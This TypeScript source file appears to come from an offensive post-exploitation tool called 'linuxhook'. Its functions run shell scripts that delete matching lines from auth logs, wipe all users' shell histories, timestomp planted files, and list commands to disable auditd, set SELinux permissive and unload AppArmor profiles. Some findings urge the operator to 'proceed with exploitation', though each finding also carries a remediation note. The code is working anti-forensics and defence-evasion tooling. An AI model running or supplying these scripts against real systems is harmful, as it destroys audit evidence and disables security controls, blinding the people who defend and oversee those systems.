import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function logTamper(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Log Tampering ==="]
  const pattern = argVal(args, "--pattern")
  const file = argVal(args, "--file")

  const script = `
echo "--- Log Files ---"
ls -lah /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/kern.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null

echo ""
echo "--- Log Permissions ---"
stat -c '%a %U:%G %n' /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages 2>/dev/null

echo ""
echo "--- Journald Status ---"
systemctl status systemd-journald 2>/dev/null | head -5
journalctl --disk-usage 2>/dev/null

${pattern && file ? `
echo ""
echo "--- Removing entries matching '${pattern}' from ${file} ---"
before=$(wc -l < "${file}" 2>/dev/null)
sed -i "/${pattern}/d" "${file}" 2>/dev/null
after=$(wc -l < "${file}" 2>/dev/null)
echo "Removed $((before - after)) line(s) from ${file}"
` : `
echo ""
echo "--- Usage ---"
echo "linuxhook log_tamper --file /var/log/auth.log --pattern '192.168.1.100'"
echo ""
echo "Manual examples:"
echo "  sed -i '/192.168.1.100/d' /var/log/auth.log"
echo "  > /var/log/auth.log  (clear entire file)"
echo "  shred -zu /var/log/auth.log  (secure delete)"
echo "  echo '' | tee /var/log/syslog  (truncate)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (pattern && file && r.stdout.includes("Removed")) {
    findings.push({
      checkId: "LNX-LOGTAMP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXPLOITED",
      resource: file,
      title: "Log entries tampered",
      details: `Entries matching '${pattern}' removed from ${file}`,
      remediation: "Ship logs to a remote SIEM in real-time. Use append-only log storage.",
    })
  }

  findings.push({
    checkId: "LNX-LOGTAMP-002",
    provider: "linuxhook",
    severity: "INFO",
    status: "IDENTIFIED",
    resource: "/var/log",
    title: "Log files enumerated",
    details: "System log files and permissions assessed for tampering viability",
    remediation: "Implement centralized logging with immutable storage. Enable log integrity monitoring.",
  })

  return { output: output.join("\n"), findings }
}

export async function historyClear(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== History Clearing ==="]

  const script = `
echo "--- Current History Files ---"
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history" ".node_repl_history" ".mysql_history" ".psql_history"; do
    if [ -f "$dir/$hf" ]; then
      lines=$(wc -l < "$dir/$hf" 2>/dev/null)
      echo "[*] $dir/$hf: $lines lines"
    fi
  done
done

echo ""
echo "--- History Environment ---"
echo "HISTFILE=${HISTFILE:-not set}"
echo "HISTSIZE=${HISTSIZE:-not set}"
echo "HISTFILESIZE=${HISTFILESIZE:-not set}"
echo "HISTCONTROL=${HISTCONTROL:-not set}"

echo ""
echo "--- Clearing History ---"
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
history -c 2>/dev/null
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history"; do
    if [ -f "$dir/$hf" ] && [ -w "$dir/$hf" ]; then
      > "$dir/$hf" 2>/dev/null && echo "[+] Cleared $dir/$hf"
    fi
  done
done

echo ""
echo "--- Prevent Future Logging ---"
echo "Run these in your shell session:"
echo "  unset HISTFILE"
echo "  export HISTSIZE=0"
echo "  set +o history"
echo "  Or prefix commands with a space (if HISTCONTROL=ignorespace)"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const cleared = (r.stdout.match(/Cleared/g) || []).length
  findings.push({
    checkId: "LNX-HISTCLR-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: cleared > 0 ? "EXPLOITED" : "IDENTIFIED",
    resource: "shell_history",
    title: cleared > 0 ? `Shell history cleared (${cleared} files)` : "Shell history files enumerated",
    details: cleared > 0 ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session` : "History files found — clear before exiting",
    remediation: "Forward command history to a centralized audit system. Use auditd for command logging.",
  })

  return { output: output.join("\n"), findings }
}

export async function timestomp(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Timestomping ==="]
  const target = argVal(args, "--target")
  const reference = argVal(args, "--reference")

  const script = `
${target ? `
echo "--- Current Timestamps ---"
stat "${target}" 2>/dev/null

${reference ? `
echo ""
echo "--- Reference File Timestamps ---"
stat "${reference}" 2>/dev/null

echo ""
echo "--- Applying Timestamps ---"
touch -r "${reference}" "${target}" 2>/dev/null && echo "[+] atime/mtime copied from ${reference} to ${target}"
stat "${target}" 2>/dev/null
` : `
echo ""
echo "--- Modifying Timestamps ---"
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo "  This copies atime/mtime from the reference file"
echo ""
echo "Manual approaches:"
echo "  touch -r /bin/ls target_file        # copy timestamps from reference"
echo "  touch -t 202301011200 target_file   # set specific timestamp"
echo "  debugfs -w -R 'set_inode_field <inode> crtime 202301011200' /dev/sda1  # ctime (requires debugfs)"
`}
` : `
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo ""
echo "--- Recently Modified Files (last 24h) ---"
find /tmp /var/tmp /dev/shm -newer /etc/hostname -type f 2>/dev/null | head -20
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (target && reference && r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-TIMESTOMP-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "EXPLOITED",
      resource: target,
      title: "File timestamps modified",
      details: `Timestamps on ${target} copied from ${reference} — file now blends with legitimate system files`,
      remediation: "Use file integrity monitoring (AIDE, Tripwire). Monitor inode change times via auditd.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function auditdEvade(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Auditd Evasion ==="]

  const script = `
echo "--- Auditd Status ---"
systemctl status auditd 2>/dev/null | head -5 || service auditd status 2>/dev/null | head -3
ps aux 2>/dev/null | grep auditd | grep -v grep

echo ""
echo "--- Audit Rules ---"
auditctl -l 2>/dev/null || echo "[-] Cannot list rules (not root or auditctl not found)"

echo ""
echo "--- Audit Configuration ---"
cat /etc/audit/auditd.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
cat /etc/audit/audit.rules 2>/dev/null | grep -vE "^(#|$)" | head -20
ls -la /etc/audit/rules.d/ 2>/dev/null

echo ""
echo "--- Audit Log Size ---"
ls -lah /var/log/audit/audit.log 2>/dev/null
wc -l /var/log/audit/audit.log 2>/dev/null

echo ""
echo "--- Evasion Options ---"
echo "  auditctl -D                 # Delete all rules"
echo "  auditctl -e 0               # Disable auditing"
echo "  service auditd stop         # Stop auditd"
echo "  kill -STOP \$(pidof auditd)   # Pause auditd"
echo "  > /var/log/audit/audit.log  # Clear log"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("running") || r.stdout.includes("auditd")) {
    findings.push({
      checkId: "LNX-AUDITD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "auditd",
      title: "Auditd is active — actions are being logged",
      details: "Audit daemon is running with rules active. Consider disabling or pausing before sensitive operations.",
      remediation: "Protect auditd with immutable rules (-e 2). Ship logs to remote SIEM.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function selinuxBypass(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SELinux Bypass ==="]

  const script = `
echo "--- SELinux Status ---"
getenforce 2>/dev/null || echo "[-] getenforce not available"
sestatus 2>/dev/null || echo "[-] sestatus not available"

echo ""
echo "--- Current Context ---"
id -Z 2>/dev/null || echo "[-] No SELinux context"

echo ""
echo "--- SELinux Booleans (security-relevant) ---"
getsebool -a 2>/dev/null | grep -iE "(httpd_can_network|allow_ptrace|allow_execmem|allow_execstack|secure_mode)" | head -20

echo ""
echo "--- Permissive Domains ---"
semanage permissive -l 2>/dev/null | head -20

echo ""
echo "--- Bypass Options ---"
echo "  setenforce 0                          # Set permissive (requires root)"
echo "  chcon -t unconfined_t /path/to/file   # Change file context"
echo "  runcon -t unconfined_t /bin/bash       # Run in unconfined context"
echo "  setsebool -P httpd_can_network_connect on  # Enable network for httpd"
echo "  semanage permissive -a httpd_t         # Set domain permissive"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const enforcing = r.stdout.includes("Enforcing")
  const permissive = r.stdout.includes("Permissive")
  const disabled = r.stdout.includes("Disabled") || r.stdout.includes("getenforce not available")

  if (enforcing) {
    findings.push({
      checkId: "LNX-SELINUX-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "selinux",
      title: "SELinux is enforcing — restricts exploitation",
      details: "SELinux in enforcing mode. Some exploits and persistence mechanisms may be blocked. Consider setting permissive or using unconfined contexts.",
      remediation: "Keep SELinux enforcing. Use targeted policy. Audit policy changes.",
    })
  }
  if (permissive) {
    findings.push({
      checkId: "LNX-SELINUX-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "selinux",
      title: "SELinux is permissive — logging only",
      details: "SELinux in permissive mode — actions logged but NOT blocked. Proceed with exploitation.",
      remediation: "Set SELinux to enforcing mode. Investigate why it was set to permissive.",
    })
  }
  if (disabled) {
    findings.push({
      checkId: "LNX-SELINUX-003",
      provider: "linuxhook",
      severity: "LOW",
      status: "FOUND",
      resource: "selinux",
      title: "SELinux is disabled — no MAC restrictions",
      details: "SELinux disabled or not installed — no mandatory access control restrictions apply",
      remediation: "Enable SELinux in enforcing mode with targeted policy.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function apparmorBypass(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== AppArmor Bypass ==="]

  const script = `
echo "--- AppArmor Status ---"
aa-status 2>/dev/null || echo "[-] aa-status not available or not root"
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -30

echo ""
echo "--- Profile Modes ---"
aa-status 2>/dev/null | grep -E "(enforce|complain|unconfined)" | head -20

echo ""
echo "--- Current Process Profile ---"
cat /proc/self/attr/current 2>/dev/null || echo "[-] Cannot read current profile"

echo ""
echo "--- Bypass Options ---"
echo "  aa-complain /path/to/profile   # Set to complain mode"
echo "  aa-disable /path/to/profile    # Disable profile"
echo "  apparmor_parser -R /etc/apparmor.d/profile  # Unload profile"
echo "  ln -s /etc/apparmor.d/profile /etc/apparmor.d/disable/  # Disable on boot"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("enforce")) {
    const enforced = (r.stdout.match(/enforce/g) || []).length
    findings.push({
      checkId: "LNX-APPARMOR-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "apparmor",
      title: `AppArmor active with ${enforced} enforcing profile(s)`,
      details: "AppArmor profiles in enforce mode — may restrict exploitation. Set to complain mode or disable specific profiles.",
      remediation: "Keep AppArmor profiles enforcing. Audit profile changes.",
    })
  }

  if (r.stdout.includes("unconfined")) {
    findings.push({
      checkId: "LNX-APPARMOR-002",
      provider: "linuxhook",
      severity: "LOW",
      status: "FOUND",
      resource: "apparmor",
      title: "Unconfined processes detected",
      details: "Some processes run without AppArmor confinement — can be exploited without profile restrictions",
      remediation: "Create AppArmor profiles for all services. Minimize unconfined processes.",
    })
  }

  return { output: output.join("\n"), findings }
}
